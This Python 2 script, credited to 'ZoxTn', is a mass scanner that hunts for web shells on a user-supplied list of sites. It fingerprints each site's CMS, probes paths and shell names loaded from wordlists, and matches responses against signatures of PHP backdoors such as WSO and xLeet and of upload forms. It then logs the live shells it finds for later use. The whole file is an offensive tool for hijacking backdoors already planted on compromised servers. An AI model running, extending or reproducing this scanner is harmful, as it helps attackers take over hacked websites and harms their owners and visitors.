import sys , requests, re , socket , random , string , base64 , itertools , os , urllib2 , codecs
from itertools import product
import concurrent.futures
import time
from time import time as timer
from platform import system	
from pprint import pprint
from colorama import Fore
from colorama import Style	
from colorama import init
from urlparse import urlparse
import warnings
import subprocess
import urllib
from urlparse import urlparse
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
##########################################################################################
ktnred = '\033[31m'
ktngreen = '\033[32m'
ktn3yell = '\033[33m'
ktn4blue = '\033[34m'
ktn5purp = '\033[35m'
ktn6blueblue = '\033[36m'
ktn7grey = '\033[37m'
CEND = '\033[0m'		
#########################################################################################
fr  =   Fore.RED
fg  =   Fore.GREEN
def logo():
	clear = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37]
	x = ''' 				 
  [#] Created By :
	 ______      _________      
	|___  /     |___   ___|    
	   / /___ _  __ | |_ _      
	  / // _ \ \/ /| | ._. \  
	 / /| (_) >  < | | | | | 
	/____\___/_/\_\|_/_| |_|
                              
                            Telegram: @ZoxTn                
                                              
 '''

	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
		time.sleep(0.05)
		pass

logo()

requests.urllib3.disable_warnings()
se = requests.session()
Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

####
try:
	spy =raw_input('Enter Your List :')
	with codecs.open(spy, mode='r', encoding='ascii', errors='ignore') as f:
		ooo = f.read().splitlines()
except IndexError:
	print (ktnred + '[+]================> ' + 'USAGE: '+sys.argv[0]+' listip.txt' + CEND)
	pass
ooo = list((ooo))
####
try:
    os.mkdir('result')
except:
    pass

try:
    os.mkdir('cms')
except:
    pass


headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

character = string.ascii_letters + string.digits


def wordpress(url):
    path0 = se.get(url, headers=Agent, verify=False, timeout=50)
    path4 = se.get(url + '/license.txt', headers=Agent, verify=False, timeout=50)
    path5 = se.get(url + '/xmlrpc.php?rsd', headers=Agent, verify=False, timeout=50)
    if path4.status_code != 404:
        if 'WordPress' in path4.content.encode('utf-8'):
            return True
    elif path5.status_code != 404:
        if 'WordPress' in path4.content.encode('utf-8'):
            return True
    elif ('/wp-includes/' in path0.content.encode('utf-8')) or ('WordPress' in path0.content.encode('utf-8')):
        return True
    else:
        return False

##################################
def joomla(url):
    path1 = se.get(url + '/README.txt', headers=Agent, verify=False, timeout=50)
    path2 = se.get(url + '/robots.txt', headers=Agent, verify=False, timeout=50)
    path3 = se.get(url + '/language/en-GB/en-GB.xml', headers=Agent, verify=False, timeout=50)
    if path1.status_code != 404:
        if 'Joomla' in path1.content.encode('utf-8'):
            return True
    elif path2.status_code != 404:
        if 'Joomla' in path2.content.encode('utf-8'):
            return True
    elif path3.status_code != 404:
        if 'Joomla' in path3.content.encode('utf-8'):
            return True
    else:
            return False
##################################
def drupal(url):
    path0 = se.get(url, headers=Agent, verify=False, timeout=50)
    path6 = se.get(url + '/CHANGELOG.txt', headers=Agent, verify=False, timeout=50)
    if path6.status_code != 404:
        if 'Drupal' in path6.content.encode('utf-8'):
            return True
    elif '/sites/default/' in path0.content.encode('utf-8'):
        return True
    else:
        return False
##################################
def opencart(url):
    path0 = se.get(url, headers=Agent, verify=False, timeout=50)
    if 'catalog/view/' in path0.content.encode('utf-8'):
        return True
    else:
        return False
##################################
def DetectCMS(url):
    kill1 = se.get(url, headers=Agent, verify=False, timeout=50)
    if kill1.status_code != 404:
        if wordpress(url):
            return 'wordpress'
        elif joomla(url):
            return 'joomla'
        elif drupal(url):
            return 'drupal'
        elif opencart(url):
            return 'opencart'
        else:
            return 'unknown'
    else:
        pass





def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    return site

def exploit(rabet):
    try :
        try :
            url = URLdomain(rabet)
            Check_CMs = DetectCMS(url)
            if Check_CMs == 'wordpress':
                print ktn3yell + ' |Wordpress| ' + url + ' | ...'
                pathez = open("Tools/wordpress","r")
                open('cms/Wordpress.txt', 'a').write(url +' \n')
                
            elif Check_CMs == 'joomla':
                print ktn6blueblue + ' |Joomla| ' + url + ' | ...'
                pathez = open("Tools/joomla","r")
                open('cms/Joomla.txt', 'a').write(url +' \n')
                
            elif Check_CMs == 'drupal':
                print ktn4blue + ' |Drupal| ' + url + ' | ...'
                pathez = open("Tools/drupal","r")
                open('cms/Drupal.txt', 'a').write(url +' \n')
                
            elif Check_CMs == 'opencart':
                print ktn5purp + ' |Opencart| ' + url + ' | ...'
                pathez = open("Tools/opencart","r")
                open('cms/Opencart.txt', 'a').write(url +' \n')
                
            else:
                print ktnred + ' |Unknown| ' + url + ' | ...'
                pathez = open("Tools/others","r")
                open('cms/Unknown.txt', 'a').write(url +' \n')
            breaker = False
            direz = pathez.readlines()
            for dire in direz:
                dire = dire.replace("\n","")
                kellx = url+dire
                killoor = se.get(kellx, headers=Agent, verify=False, timeout=50)
                if ((killoor.status_code != 404)):
                    try :
                        shellnames = open("Tools/shellnames","r")
                        names = shellnames.readlines()
                        for name in names:
                            name = name.replace("\n","")
                            inj = url+dire+'/'+name
                            check = se.get(inj, headers=headers, verify=False, timeout=15).content
                            if ("<html> <!--  </form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td>" in check) or ('WSO 4.2.5' in check) or ('xLeet 4.2.5' in check) :
                                open('result/shellz.txt', 'a').write(inj  + '\n')
                                print ' -|ZoxTn|- ' + inj + '--> {}[Shell/Up]'.format(fg)
                                breaker = True
                                break
                            elif ('<form enctype="multipart/form-data" method="POST">' in check) or ("value='uploadFile'>" in check) or ('<form method="post" enctype="multipart/form-data">' in check) or ("<form method='POST' enctype='multipart/form-data'>" in check) :
                                open('result/up.txt', 'a').write(inj  + '\n')
                                print ' -|ZoxTn|- ' + inj + '--> {}[Shell/Up]'.format(fg)
                                breaker = True
                                break
                                
                            elif ("<input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'>" in check) :
                                open('result/shellz.txt', 'a').write(inj  + '\n')
                                print ' -|ZoxTn|- ' + inj + '--> {}[Shell/Up]'.format(fg)
                                breaker = True
                                break
                            else:
                                pass

                        

                    except :
                        pass
                    if breaker:
                        break
            print ktn4blue + ' Stopped >>> ' + url
        except :
            pass
    except :    
        print ' -|ZoxTn|- ' + url + '--> {}[Failed]'.format(fr)


def Main():
    try:
        
        start = timer()
	zonum =raw_input('Threads :')
        ThreadPool = Pool(int(zonum))
        Threads = ThreadPool.map(exploit, ooo)
    except:
        pass


if __name__ == '__main__':
	Main()